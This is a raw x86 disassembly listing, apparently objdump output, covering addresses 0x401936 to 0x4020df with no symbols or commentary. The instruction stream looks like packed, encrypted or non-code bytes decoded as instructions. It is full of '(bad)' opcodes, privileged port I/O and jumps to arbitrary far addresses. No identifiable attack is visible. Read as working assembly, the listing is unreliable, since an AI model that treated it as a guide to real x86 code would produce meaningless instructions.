  401936:	das    
  401937:	adc    al,0x9e
  401939:	jne    0x40199d
  40193b:	fldpi  
  40193d:	pop    ecx
  40193e:	jo     0x401986
  401940:	fdivr  st,st(5)
  401942:	cs cmp al,0x34
  401945:	push   edx
  401946:	dec    ecx
  401947:	stos   BYTE PTR es:[edi],al
  401948:	sub    BYTE PTR [eax-0x130ac537],bl
  40194e:	add    eax,0x9f80808c
  401953:	mov    ch,0x11
  401955:	add    eax,0xca2b493f
  40195a:	mov    eax,0x4c871c74
  40195f:	test   DWORD PTR [esi-0x146d7e98],edx
  401965:	adc    DWORD PTR [edx],ebx
  401967:	cmp    dl,ch
  401969:	push   cs
  40196a:	cli    
  40196b:	(bad)
  40196f:	push   ebx
  401970:	sbb    dl,BYTE PTR [ebx-0x3f48d5a9]
  401976:	adc    ebx,esi
  401978:	or     DWORD PTR [eax+0x2e12e668],ebp
  40197e:	sbb    al,0x4b
  401980:	cmp    ch,BYTE PTR [edi+ecx*4-0x705b11f3]
  401987:	sbb    BYTE PTR [edi],0x45
  40198a:	int3   
  40198b:	push   esi
  40198c:	mov    eax,0x4eb4776d
  401991:	pop    es
  401992:	mov    edx,0xd9617aec
  401997:	add    DWORD PTR [ebx-0x7],ebp
  40199a:	dec    ebp
  40199b:	shl    DWORD PTR [esi],cl
  40199d:	mov    al,0x34
  40199f:	out    0xd4,al
  4019a1:	mov    WORD PTR [edx+0x69],?
  4019a4:	(bad)  
  4019a5:	out    0xce,eax
  4019a7:	push   ebx
  4019a8:	dec    eax
  4019a9:	cld    
  4019aa:	pop    edx
  4019ab:	cmp    ebp,esp
  4019ad:	in     eax,dx
  4019ae:	xor    ebp,DWORD PTR ss:[eax-0x75879ef3]
  4019b5:	sub    DWORD PTR [ebx+0x1c],ecx
  4019b8:	(bad)  
  4019b9:	jbe    0x401a2b
  4019bb:	pop    edi
  4019bc:	adc    DWORD PTR [ecx],esp
  4019be:	scas   al,BYTE PTR es:[edi]
  4019bf:	jg     0x401991
  4019c1:	addr16 mov ebp,0xce614beb
  4019c7:	idiv   BYTE PTR [edi]
  4019c9:	dec    ecx
  4019ca:	inc    ebx
  4019cb:	cli    
  4019cc:	and    bl,bl
  4019ce:	inc    edx
  4019cf:	xchg   ebx,eax
  4019d0:	arpl   bx,si
  4019d2:	pop    esi
  4019d3:	sar    DWORD PTR [eax-0x5],cl
  4019d6:	cmp    BYTE PTR [ecx],dh
  4019d8:	imul   dh
  4019da:	ins    BYTE PTR es:[edi],dx
  4019db:	mov    eax,ds:0x8d282ed9
  4019e0:	shl    bh,cl
  4019e2:	sbb    DWORD PTR [ebx-0x5cc85bbd],edx
  4019e8:	cmp    BYTE PTR [edi-0x5c2249c6],al
  4019ee:	pop    ecx
  4019ef:	or     BYTE PTR [esi],ch
  4019f1:	sub    BYTE PTR [edi],cl
  4019f3:	jmp    0x4019b8
  4019f5:	sbb    eax,0x63cb5321
  4019fa:	inc    edx
  4019fb:	loop   0x401983
  4019fd:	xor    BYTE PTR [esi+0x5a3de392],bl
  401a03:	fwait
  401a04:	jne    0x401a3a
  401a06:	xlat   BYTE PTR ds:[ebx]
  401a07:	mov    dh,BYTE PTR [ebx]
  401a09:	push   esi
  401a0a:	(bad)  
  401a0b:	sbb    DWORD PTR [ebx],edx
  401a0d:	(bad)
  401a11:	stc    
  401a12:	xchg   DWORD PTR [ebp-0x50],esp
  401a15:	fisubr DWORD PTR [edx-0x7e16196b]
  401a1b:	dec    BYTE PTR [edi+0x69]
  401a1e:	clc    
  401a1f:	sub    BYTE PTR [ecx],ch
  401a21:	mov    ecx,0xf3348045
  401a26:	jp     0x401a10
  401a28:	mov    edi,edi
  401a2a:	mov    ebp,0xee38d7e
  401a2f:	das    
  401a30:	int3   
  401a31:	mov    al,0x13
  401a33:	sub    esi,ebx
  401a35:	and    BYTE PTR [ecx],cl
  401a37:	push   esp
  401a38:	jns    0x4019ed
  401a3a:	lea    edx,[eax+0x61]
  401a3d:	ins    BYTE PTR es:[edi],dx
  401a3e:	fdiv   QWORD PTR [ebp-0x27]
  401a41:	sbb    edx,DWORD PTR [edx]
  401a43:	ret    
  401a44:	mov    ch,0xd7
  401a46:	ret    0x493c
  401a49:	popf   
  401a4a:	cld    
  401a4b:	cs sbb eax,0xc3de20e6
  401a51:	(bad)  
  401a52:	pop    ebx
  401a53:	call   0x9fc04ccb
  401a58:	mov    dl,dl
  401a5a:	xchg   ebp,eax
  401a5b:	fwait
  401a5c:	jecxz  0x401abe
  401a5e:	xor    bl,BYTE PTR [edx-0x12]
  401a61:	int3   
  401a62:	dec    ecx
  401a63:	add    dl,ah
  401a65:	arpl   WORD PTR [edi],cx
  401a67:	xchg   esi,esi
  401a69:	push   ebx
  401a6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a6b:	push   es
  401a6c:	cmp    BYTE PTR [edx-0x6fa780e3],cl
  401a72:	into   
  401a73:	(bad)  
  401a74:	xchg   edx,eax
  401a75:	jbe    0x401a57
  401a77:	sbb    cl,ch
  401a79:	out    0xfe,al
  401a7b:	cmp    DWORD PTR [ebx+0x4c],ecx
  401a7e:	dec    esp
  401a7f:	lea    ebx,gs:[edx-0x3a421a0e]
  401a86:	icebp  
  401a87:	(bad)
  401a8a:	jle    0x401a46
  401a8c:	xor    BYTE PTR [ebx+0xf30f3b5],ch
  401a92:	outs   dx,DWORD PTR ds:[esi]
  401a93:	ret    0xf702
  401a96:	dec    esp
  401a97:	xchg   BYTE PTR [edx+0x50],bh
  401a9a:	xor    DWORD PTR [edi],ebp
  401a9c:	pop    cx
  401a9e:	mov    al,0xb3
  401aa0:	div    BYTE PTR [ecx+ecx*1-0x29]
  401aa4:	int    0x8d
  401aa6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401aa7:	sbb    bl,BYTE PTR [ebp*4-0x6cce7788]
  401aae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401aaf:	push   DWORD PTR [edx+0x30]
  401ab2:	push   eax
  401ab3:	test   dh,ah
  401ab5:	dec    ebp
  401ab6:	sbb    BYTE PTR [esi-0x2b46aa9],bl
  401abc:	xlat   BYTE PTR ds:[ebx]
  401abd:	add    ecx,edi
  401abf:	mov    ecx,0xcd0c3fe6
  401ac4:	cs repnz cmp DWORD PTR es:[ebp-0xe],ebx
  401aca:	mov    fs,WORD PTR [esp+edx*2+0x4d]
  401ace:	xchg   ecx,eax
  401acf:	cpuid  
  401ad1:	popa   
  401ad2:	fcomp  QWORD PTR [ebp+0x48]
  401ad5:	repnz inc ecx
  401ad7:	and    edi,edi
  401ad9:	mov    dh,0x50
  401adb:	test   BYTE PTR [ebp+0x1f7aa67e],bl
  401ae1:	pop    ebx
  401ae2:	adc    edx,DWORD PTR [ebp-0x4d]
  401ae5:	add    DWORD PTR [edi+0xe],esp
  401ae8:	jge    0x401abf
  401aea:	push   ds
  401aeb:	(bad)  
  401aec:	fdiv   DWORD PTR [edi]
  401aee:	test   al,0x9a
  401af0:	(bad)  
  401af1:	cld    
  401af2:	mov    al,0xab
  401af4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401af5:	mov    esi,0xb4f78142
  401afa:	int    0x42
  401afc:	(bad)  
  401afe:	push   ebp
  401aff:	fwait
  401b00:	cmp    dh,bh
  401b02:	test   al,0xa9
  401b04:	inc    edx
  401b05:	or     dh,bh
  401b07:	dec    ecx
  401b08:	adc    bl,BYTE PTR [esi+0x15e623d4]
  401b0e:	adc    al,0xa
  401b10:	inc    ebp
  401b11:	fisub  DWORD PTR [esi-0x592c6a57]
  401b17:	mov    dh,0x4b
  401b19:	pop    esi
  401b1a:	and    edx,DWORD PTR [eax-0x40ab5bfc]
  401b20:	and    DWORD PTR [ecx],eax
  401b22:	test   al,0xcd
  401b24:	mov    es,esi
  401b26:	(bad)  [ebp-0x39]
  401b29:	out    0x4b,al
  401b2b:	adc    al,0x46
  401b2d:	ret    0x7d3d
  401b30:	mov    edi,DWORD PTR [edi]
  401b32:	mov    ch,0xd8
  401b34:	jb     0x401bb4
  401b36:	xchg   esp,eax
  401b37:	xor    esp,DWORD PTR [edx-0x6db88647]
  401b3d:	mov    dh,0x3
  401b3f:	sti    
  401b40:	mov    ah,0xd6
  401b42:	sbb    DWORD PTR [esi-0x7d],edi
  401b45:	ficom  WORD PTR [ebx-0x25a30d4f]
  401b4b:	aad    0x95
  401b4d:	div    BYTE PTR [edi]
  401b4f:	adc    eax,0x8b463187
  401b54:	dec    ecx
  401b55:	retf   
  401b56:	lds    eax,FWORD PTR [ecx]
  401b58:	mov    eax,ds:0x1edd041f
  401b5d:	repz fwait
  401b5f:	add    DWORD PTR [ebx+0x63],esi
  401b62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b63:	lods   eax,DWORD PTR ds:[esi]
  401b64:	fwait
  401b65:	mov    ds:0xf2d81b16,al
  401b6a:	(bad)  
  401b6b:	xchg   ebx,eax
  401b6c:	bound  edi,QWORD PTR [edi+0x6473de71]
  401b72:	mov    edx,0x5bf6bbf8
  401b77:	out    0x37,al
  401b79:	sbb    esi,eax
  401b7b:	aaa    
  401b7c:	jmp    FWORD PTR [eax-0xabdaffe]
  401b82:	int    0x2b
  401b84:	cmc    
  401b85:	call   0xe4a72bd4
  401b8a:	inc    ebx
  401b8b:	or     BYTE PTR [ecx-0x6bf3cdcb],0x5a
  401b92:	or     ecx,DWORD PTR [edx+0x29]
  401b95:	mov    WORD PTR [ebx-0x75],fs
  401b98:	sbb    DWORD PTR [ecx-0x6f],edi
  401b9b:	push   esp
  401b9c:	lock push es
  401b9e:	mov    ds:0xafa0c499,al
  401ba3:	int3   
  401ba4:	mov    ah,0x4e
  401ba6:	xor    DWORD PTR [eax+0x1173e683],ecx
  401bac:	(bad)  
  401bad:	fldenv [ecx-0x63a887b8]
  401bb3:	add    al,0xc1
  401bb5:	daa    
  401bb6:	dec    ebp
  401bb7:	clc    
  401bb8:	xchg   ebp,eax
  401bb9:	jge    0x401bf0
  401bbb:	mov    ah,0x79
  401bbd:	or     DWORD PTR [ecx+0x6f80f3ff],ebx
  401bc3:	std    
  401bc4:	add    esi,DWORD PTR [esi-0x2e]
  401bc7:	pop    ebp
  401bc8:	sub    eax,0xbc1a98a1
  401bcd:	stc    
  401bce:	in     eax,0x17
  401bd0:	hlt    
  401bd1:	pop    ds
  401bd2:	ret    0xaf43
  401bd5:	pusha  
  401bd6:	movzx  ebp,BYTE PTR [esi]
  401bd9:	jne    0x401c2e
  401bdb:	jecxz  0x401be9
  401bdd:	(bad)  
  401bde:	or     edi,DWORD PTR [eax+0x7c60c12d]
  401be4:	cmc    
  401be5:	mov    dl,0xa0
  401be7:	mov    al,ds:0x3ec5b1f5
  401bec:	call   0x8eab:0x2a26c62e
  401bf3:	mov    al,ds:0xfeb4616d
  401bf8:	repz jne 0x401bc0
  401bfb:	dec    esi
  401bfc:	inc    ebp
  401bfd:	adc    bh,BYTE PTR [eax+0x36]
  401c00:	imul   edx,DWORD PTR [ebp+0x1822a3c4],0xa
  401c07:	add    al,0x77
  401c09:	xor    BYTE PTR [edi-0x71e2e95e],bl
  401c0f:	mov    bh,0x89
  401c11:	nop
  401c12:	loope  0x401c11
  401c14:	popf   
  401c15:	jecxz  0x401c80
  401c17:	jbe    0x401beb
  401c19:	fist   WORD PTR [ecx]
  401c1b:	aas    
  401c1c:	loop   0x401be7
  401c1e:	pop    esp
  401c1f:	ja     0x401c79
  401c21:	test   DWORD PTR [esp+edx*8],ebx
  401c24:	mov    al,al
  401c26:	sti    
  401c27:	jmp    0xba84:0x8e5736cc
  401c2e:	jmp    0x401c15
  401c30:	sbb    BYTE PTR [esi-0x1769c654],bl
  401c36:	hlt    
  401c37:	mov    al,0xe6
  401c39:	xor    DWORD PTR [edi-0x78],eax
  401c3c:	mov    sp,WORD PTR [eax]
  401c3f:	scas   eax,DWORD PTR es:[edi]
  401c40:	xchg   ecx,eax
  401c41:	ins    DWORD PTR es:[edi],dx
  401c42:	addr16 jne 0x401c10
  401c45:	sub    eax,0x8eb97912
  401c4a:	pop    ebx
  401c4b:	call   0xc2f149ac
  401c50:	adc    al,0x5
  401c52:	sub    ebp,DWORD PTR [ebx-0x51a5933]
  401c58:	xchg   ebx,eax
  401c59:	push   edi
  401c5a:	test   DWORD PTR [ecx+0x3e155814],edx
  401c60:	mov    eax,0xd6c4a1cb
  401c65:	add    al,al
  401c67:	in     eax,dx
  401c68:	xchg   esp,eax
  401c69:	sbb    al,0x94
  401c6b:	jmp    0xf2b66d33
  401c70:	repz icebp 
  401c72:	or     BYTE PTR [ebx],0x2
  401c75:	cdq    
  401c76:	scas   al,BYTE PTR es:[edi]
  401c77:	rol    edi,cl
  401c79:	xchg   edi,eax
  401c7a:	mov    edx,0x33dde1e6
  401c7f:	sahf   
  401c80:	stos   BYTE PTR es:[edi],al
  401c81:	call   0x9ee487dc
  401c86:	lea    edx,[ebx+edi*4+0x6b]
  401c8a:	sbb    ebp,ecx
  401c8c:	add    al,0x50
  401c8e:	jge    0x401c54
  401c90:	enter  0xa07e,0x20
  401c94:	stc    
  401c95:	neg    DWORD PTR [edx-0x38]
  401c98:	sub    BYTE PTR [ecx+0x123b80ad],al
  401c9e:	clc    
  401c9f:	loop   0x401c3b
  401ca1:	xchg   edi,eax
  401ca2:	adc    cl,0x26
  401ca5:	and    ecx,esi
  401ca7:	dec    ebp
  401ca8:	mov    eax,0xf9a7ff41
  401cad:	or     BYTE PTR [edi+0x4472a7fe],0xdd
  401cb4:	inc    edx
  401cb5:	adc    al,0x97
  401cb7:	add    DWORD PTR [esi],esi
  401cb9:	in     al,dx
  401cba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401cbb:	xchg   edi,eax
  401cbc:	mov    ebp,0x70d69844
  401cc1:	je     0x401c5b
  401cc3:	leave  
  401cc4:	inc    edi
  401cc5:	fstp   QWORD PTR [edi]
  401cc7:	out    dx,eax
  401cc8:	dec    esp
  401cc9:	mov    ebp,0x4939eda2
  401cce:	and    BYTE PTR [ecx+0x770bcd56],cl
  401cd4:	mov    edx,0x1788c9b7
  401cd9:	(bad)  
  401cda:	cli    
  401cdb:	jmp    0x401d29
  401cdd:	or     DWORD PTR [eax+0x36],ecx
  401ce0:	add    al,0x4c
  401ce2:	inc    ebx
  401ce3:	out    dx,al
  401ce4:	mov    eax,ds:0xe3635757
  401ce9:	mov    ah,0xcf
  401ceb:	rol    ch,0x3b
  401cee:	pop    edx
  401cef:	adc    DWORD PTR [edi],ebx
  401cf1:	sbb    eax,0x1526183f
  401cf6:	lahf   
  401cf7:	xlat   BYTE PTR ds:[ebx]
  401cf8:	cmp    DWORD PTR [edx-0x4f],ecx
  401cfb:	jmp    0x287d:0x7ae2b855
  401d02:	in     eax,0xf5
  401d04:	stc    
  401d05:	sub    BYTE PTR [edx],bh
  401d07:	test   BYTE PTR [edi],bl
  401d09:	retf   0x9e95
  401d0c:	int    0xca
  401d0e:	xlat   BYTE PTR ds:[ebx]
  401d0f:	jno    0x401d4b
  401d11:	jae    0x401cd1
  401d13:	daa    
  401d14:	adc    al,0xf7
  401d16:	add    edi,DWORD PTR [ebp+0x7f]
  401d19:	jge    0x401d55
  401d1b:	sub    edi,DWORD PTR [ebp-0x55]
  401d1e:	test   BYTE PTR [edi],dl
  401d20:	mov    cl,0xbc
  401d22:	sbb    al,0xbc
  401d24:	shr    dh,cl
  401d26:	jl     0x401d4a
  401d28:	add    BYTE PTR [edx+0x68],cl
  401d2b:	(bad)  
  401d2c:	jns    0x401d51
  401d2e:	mov    al,0xf8
  401d30:	sub    ebp,ecx
  401d32:	aad    0x17
  401d34:	(bad)  [edx+edx*8-0x5d1f89f4]
  401d3b:	cmc    
  401d3c:	push   ss
  401d3d:	into   
  401d3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d3f:	and    dh,ch
  401d41:	and    ecx,DWORD PTR [edx-0x6d08e5b6]
  401d47:	or     edi,DWORD PTR [edx-0x13]
  401d4a:	push   0x5ae8038e
  401d4f:	nop
  401d50:	shr    eax,cl
  401d52:	sub    eax,ecx
  401d54:	fdiv   DWORD PTR [esi-0x609e4a8e]
  401d5a:	in     al,dx
  401d5b:	mov    esi,0x57b974af
  401d60:	cmp    DWORD PTR [edi],ebx
  401d62:	jnp    0x401d9c
  401d64:	push   esp
  401d65:	ja     0x401dcf
  401d67:	sti    
  401d68:	out    0x6e,al
  401d6a:	adc    eax,0xf49dbb2a
  401d6f:	pushf  
  401d70:	add    bl,BYTE PTR [edx+0x37]
  401d73:	push   edi
  401d74:	imul   ecx,DWORD PTR [edx],0x5
  401d77:	and    ebp,DWORD PTR [eax]
  401d79:	std    
  401d7a:	mov    eax,0x714afda4
  401d7f:	mov    al,0x5
  401d81:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d83:	xlat   BYTE PTR ds:[ebx]
  401d84:	test   BYTE PTR [eax-0x576e2c6f],ah
  401d8a:	sub    eax,0xf77a56f0
  401d8f:	sub    ah,BYTE PTR [ecx+0x4db7bacd]
  401d95:	xor    esp,DWORD PTR [eax+ebp*8]
  401d98:	and    BYTE PTR [eax-0x2d],al
  401d9b:	loop   0x401d2d
  401d9d:	and    BYTE PTR [eax+0x3e],bl
  401da0:	jecxz  0x401def
  401da2:	cmp    ecx,esi
  401da4:	leave  
  401da5:	push   edx
  401da6:	(bad)  
  401da7:	in     al,0x22
  401da9:	(bad)  
  401dac:	jnp    0x401d5b
  401dae:	lahf   
  401daf:	in     al,dx
  401db0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401db1:	adc    DWORD PTR [eax+0x4772a270],0x5c
  401db8:	call   0xd976dda3
  401dbd:	sar    DWORD PTR [ebp+0x4f3f21a1],cl
  401dc3:	stos   DWORD PTR es:[edi],eax
  401dc4:	dec    ecx
  401dc5:	pop    ecx
  401dc6:	fsubp  st(4),st
  401dc8:	pop    ds
  401dc9:	stos   DWORD PTR es:[edi],eax
  401dca:	fmul   DWORD PTR [edi]
  401dcc:	or     al,0xc
  401dce:	addr16 pop esi
  401dd0:	sub    DWORD PTR [ebx+0x36049a3f],0xfffffff2
  401dd7:	mov    ecx,0x86e7da73
  401ddc:	unpckhps xmm3,xmm5
  401ddf:	fdiv   DWORD PTR [edx]
  401de1:	sub    DWORD PTR [esi],ebp
  401de3:	or     DWORD PTR [edx-0x49],edi
  401de6:	xor    BYTE PTR [ebx-0x9],ah
  401de9:	dec    ebp
  401dea:	imul   ecx,DWORD PTR [esi+ecx*4+0x24f315e7],0x563c6897
  401df5:	xor    BYTE PTR [edx+0x3d],cl
  401df8:	fs inc eax
  401dfa:	lods   al,BYTE PTR ds:[esi]
  401dfb:	mov    bl,0xa
  401dfd:	ret    
  401dfe:	sub    BYTE PTR [ecx],cl
  401e00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e01:	and    eax,0x8254814f
  401e06:	inc    esp
  401e07:	cmp    al,0xa1
  401e09:	lea    esp,[ebp-0x2aff8ee4]
  401e0f:	ret    
  401e10:	sbb    edx,ebx
  401e12:	inc    ecx
  401e13:	clc    
  401e14:	mov    DWORD PTR [esi-0x6d],ebp
  401e17:	cdq    
  401e18:	inc    ecx
  401e19:	fdiv   st(6),st
  401e1b:	sbb    ecx,DWORD PTR [eax-0x77]
  401e1e:	or     DWORD PTR [ecx-0x6f23780f],0xfc2c424
  401e28:	rep stos DWORD PTR es:[edi],eax
  401e2a:	ds jns 0x401de4
  401e2d:	dec    esi
  401e2e:	sub    DWORD PTR [edi-0x4c4846f2],ebx
  401e34:	hlt    
  401e35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e36:	mov    ch,0x6
  401e38:	sub    al,0x9b
  401e3a:	lds    esp,FWORD PTR [esi]
  401e3c:	xchg   ebp,eax
  401e3d:	and    bh,dh
  401e3f:	lods   eax,DWORD PTR ds:[esi]
  401e40:	cmp    DWORD PTR [ebx+eax*8+0x6b],eax
  401e44:	(bad)  
  401e45:	lock mov bl,0x59
  401e48:	xor    esp,DWORD PTR [edx+edx*8-0x5ef4ad1a]
  401e4f:	mov    esi,0x3fe3f706
  401e54:	mov    dl,cl
  401e56:	xchg   esi,eax
  401e57:	in     al,dx
  401e58:	add    ecx,0x51e43e52
  401e5e:	mov    eax,0x48daff04
  401e63:	jl     0x401e49
  401e65:	fmul   QWORD PTR [ebx]
  401e67:	ret    0x3e59
  401e6a:	xchg   ebp,eax
  401e6b:	mov    ah,0xdc
  401e6d:	jg     0x401e0e
  401e6f:	in     al,0x14
  401e71:	aam    0x93
  401e73:	xchg   esp,eax
  401e74:	cli    
  401e75:	shl    BYTE PTR [esi-0x603f170e],1
  401e7b:	pop    esp
  401e7c:	es mov es,edi
  401e7f:	int3   
  401e80:	inc    esp
  401e81:	push   ebp
  401e82:	mov    ah,BYTE PTR [edi-0x185d6750]
  401e88:	inc    ebx
  401e89:	mov    ebx,0x8f059529
  401e8e:	xchg   edi,eax
  401e8f:	cmp    eax,0xa7ad9ebf
  401e94:	or     BYTE PTR [edx+0x5a],dl
  401e97:	inc    ecx
  401e98:	int    0xf5
  401e9a:	rcl    BYTE PTR [edi],cl
  401e9c:	or     ebx,DWORD PTR [ebx]
  401e9e:	push   cs
  401e9f:	push   edi
  401ea0:	cmc    
  401ea1:	stos   BYTE PTR es:[edi],al
  401ea2:	fwait
  401ea3:	mov    dl,0x59
  401ea5:	lahf   
  401ea6:	adc    al,0x51
  401ea8:	in     al,dx
  401ea9:	int    0xf
  401eab:	nop
  401eac:	cdq    
  401ead:	jae    0x401e5e
  401eaf:	sti    
  401eb0:	inc    edi
  401eb1:	sub    eax,0x32a3a89
  401eb6:	inc    esi
  401eb7:	jp     0x401f28
  401eb9:	adc    eax,0x13d93641
  401ebe:	jb     0x401eda
  401ec0:	imul   eax,DWORD PTR [esi],0x14
  401ec3:	mov    edx,0x9a87c89a
  401ec8:	or     al,0x9e
  401eca:	mov    bl,0x77
  401ecc:	pushf  
  401ecd:	cmp    ebx,eax
  401ecf:	iret   
  401ed0:	test   eax,0xad9f52da
  401ed5:	pcmpgtb mm6,QWORD PTR [edi+edi*2+0x78]
  401eda:	mov    ds:0xe4b51653,al
  401edf:	shl    BYTE PTR [ecx+ebp*2],0x82
  401ee3:	sbb    ecx,DWORD PTR [ecx+0x1b]
  401ee6:	dec    ebp
  401ee7:	mov    DWORD PTR [eax*8+0x3c89a2d9],edx
  401eee:	inc    esp
  401eef:	jecxz  0x401eb6
  401ef1:	add    ecx,DWORD PTR [edx+eiz*2-0x4682a71d]
  401ef8:	call   0x5d44:0x1d871a55
  401eff:	push   ebp
  401f00:	push   esi
  401f01:	fcmovu st,st(3)
  401f03:	cli    
  401f04:	rol    esi,0x9b
  401f07:	lock test eax,0xdbffcadf
  401f0d:	dec    ebp
  401f0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f0f:	mov    eax,0xba63f4a6
  401f14:	leave  
  401f15:	test   BYTE PTR [esp+edx*1-0x7f],bl
  401f19:	ins    DWORD PTR es:[edi],dx
  401f1a:	btr    DWORD PTR [edx],ecx
  401f1d:	adc    BYTE PTR [ebx+0x12f51e47],bl
  401f23:	sub    ebp,DWORD PTR [eax]
  401f25:	fistp  DWORD PTR [ebx]
  401f27:	aaa    
  401f28:	xchg   esp,eax
  401f29:	dec    ebp
  401f2a:	aas    
  401f2b:	test   DWORD PTR [ebp-0x3f],esp
  401f2e:	dec    eax
  401f2f:	cdq    
  401f30:	and    al,0xc6
  401f32:	in     al,dx
  401f33:	jnp    0x401f1d
  401f35:	push   ss
  401f36:	lds    esi,FWORD PTR [edx+0x5fc1702f]
  401f3c:	das    
  401f3d:	dec    edx
  401f3e:	cli    
  401f3f:	adc    al,0x27
  401f41:	es push es
  401f43:	(bad)  
  401f44:	ficom  DWORD PTR [ebp+edx*4-0x54]
  401f48:	(bad)  [edi]
  401f4a:	in     eax,0x65
  401f4c:	xchg   ecx,eax
  401f4d:	pop    ss
  401f4e:	faddp  st(4),st
  401f50:	sbb    bh,al
  401f52:	dec    DWORD PTR [eax-0x7b]
  401f55:	or     DWORD PTR [edx-0x3c],ebp
  401f58:	leave  
  401f59:	repnz enter 0xabb6,0xcb
  401f5e:	out    0x7f,eax
  401f60:	ret    0xbc70
  401f63:	jnp    0x401fa9
  401f65:	in     al,dx
  401f66:	fimul  DWORD PTR [ebx-0x48479c90]
  401f6c:	fnstsw WORD PTR [di]
  401f6f:	out    0xfc,al
  401f71:	xor    cl,ch
  401f73:	sbb    DWORD PTR [ecx],ebp
  401f75:	mov    ebp,0xf240e6f6
  401f7a:	rcl    BYTE PTR [edx],0x4
  401f7d:	add    ah,BYTE PTR [edx]
  401f7f:	scas   al,BYTE PTR es:[edi]
  401f80:	popa   
  401f81:	dec    esp
  401f82:	or     dh,ch
  401f84:	cmp    dl,0xcb
  401f87:	cmp    al,0x46
  401f89:	mov    eax,ds:0xd7b0a52f
  401f8e:	out    0xdc,eax
  401f90:	in     eax,0x7f
  401f92:	adc    edx,DWORD PTR [edx]
  401f94:	(bad)  
  401f95:	scas   al,BYTE PTR es:[edi]
  401f96:	sbb    esi,DWORD PTR [esi]
  401f98:	iret   
  401f99:	mov    esp,0x64b31b98
  401f9e:	adc    eax,0x1d4aa210
  401fa3:	mov    bh,0xec
  401fa5:	dec    ebx
  401fa6:	rcl    DWORD PTR [edi+edi*2+0x3111207],0x78
  401fae:	xlat   BYTE PTR ds:[ebx]
  401faf:	(bad)  
  401fb0:	hlt    
  401fb1:	mul    BYTE PTR [ecx-0x5da520c8]
  401fb7:	pop    es
  401fb8:	or     eax,0xad6cf8fa
  401fbd:	retf   
  401fbe:	mov    esi,0x77bbd382
  401fc3:	add    edx,DWORD PTR [ebx-0x42]
  401fc6:	inc    eax
  401fc7:	cmp    dl,BYTE PTR [esi+0x74]
  401fca:	xor    eax,0x5d1cfd2b
  401fcf:	fisttp WORD PTR [edx+0x7292aa61]
  401fd5:	push   edi
  401fd6:	ficomp WORD PTR [esi-0x4f749efe]
  401fdc:	inc    ebp
  401fdd:	ss ss push eax
  401fe0:	jnp    0x401fb0
  401fe2:	or     BYTE PTR [esi+0x356a8870],ch
  401fe8:	xor    al,0xfb
  401fea:	aas    
  401feb:	call   0x3184:0xb715d7b8
  401ff2:	rcr    BYTE PTR [edi+0x23],0xf9
  401ff6:	push   ecx
  401ff7:	ja     0x401f87
  401ff9:	pop    edx
  401ffa:	lea    ebp,[eax-0x247cb906]
  402000:	stc    
  402001:	push   ebx
  402002:	or     al,0xc3
  402004:	push   esi
  402005:	xchg   DWORD PTR [ebp-0xb],ecx
  402008:	mov    edx,0x7d86ad9f
  40200d:	mov    ebp,0xc0531407
  402012:	es mov bh,0x18
  402015:	sahf   
  402016:	mov    al,ds:0x221f5a37
  40201b:	inc    ecx
  40201c:	or     DWORD PTR [edi-0x240f6225],edi
  402022:	mov    ebx,esp
  402024:	hlt    
  402025:	mov    ebp,0x7f707d5b
  40202a:	or     eax,0x67bedcdb
  40202f:	jns    0x4020a4
  402031:	mov    BYTE PTR [ebx],ah
  402033:	and    DWORD PTR [esi],esi
  402035:	or     eax,0x4bba5318
  40203a:	add    eax,0x9d9e6ef6
  40203f:	popa   
  402040:	std    
  402041:	mov    eax,0x1320263c
  402046:	mov    bl,0xae
  402048:	das    
  402049:	inc    ecx
  40204a:	mov    al,ds:0x76d23fd9
  40204f:	es retf 
  402051:	xchg   esp,eax
  402052:	imul   edx,DWORD PTR [ebx-0x29d59348],0xaec346d2
  40205c:	sbb    eax,0xef02d124
  402061:	mov    edi,0xcfb63ca7
  402066:	cmp    DWORD PTR [eax-0x74],eax
  402069:	outs   dx,BYTE PTR ds:[esi]
  40206a:	leave  
  40206b:	push   edi
  40206c:	dec    esp
  40206d:	mov    bl,ch
  40206f:	loope  0x4020eb
  402071:	push   edx
  402072:	xor    ch,BYTE PTR [esi+ebx*4+0x56]
  402076:	enter  0x1803,0x95
  40207a:	add    esp,ecx
  40207c:	or     eax,DWORD PTR [eax+eiz*2]
  40207f:	and    BYTE PTR [esi],bh
  402081:	sti    
  402082:	xchg   edi,eax
  402083:	addr16 aaa 
  402085:	push   esp
  402086:	out    dx,al
  402087:	jg     0x4020b0
  402089:	(bad)  
  40208a:	dec    ebp
  40208b:	sbb    BYTE PTR [edx+0x2c191e4c],cl
  402091:	out    dx,eax
  402092:	js     0x402086
  402094:	pushf  
  402095:	aam    0xf2
  402097:	jp     0x4020cb
  402099:	and    DWORD PTR [edx-0x2eb8f3de],0x5fe3683d
  4020a3:	stos   BYTE PTR es:[edi],al
  4020a4:	outs   dx,DWORD PTR ds:[esi]
  4020a5:	test   al,0x1e
  4020a7:	cmp    DWORD PTR [esi+0x55bd704d],edx
  4020ad:	fcomip st,st(0)
  4020af:	int3   
  4020b0:	sub    ebp,DWORD PTR [esi+edi*8-0x1229bd74]
  4020b7:	pop    esi
  4020b8:	ficomp WORD PTR [edx+0xf]
  4020bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4020bc:	push   ebx
  4020bd:	addr16 loop 0x402138
  4020c0:	sub    ecx,DWORD PTR [ebp-0x43]
  4020c3:	jo     0x4020b4
  4020c5:	stc    
  4020c6:	fist   DWORD PTR [edx+ecx*4-0x2ca123ad]
  4020cd:	inc    edx
  4020ce:	xchg   esp,eax
  4020cf:	js     0x4020bd
  4020d1:	sar    BYTE PTR [eax+0x4b8ae4f2],cl
  4020d7:	and    al,0xf7
  4020d9:	sub    eax,DWORD PTR [edx-0x12]
  4020dc:	xchg   esi,eax
  4020dd:	jp     0x4020b7
  4020df:	mov    cl,0x6a
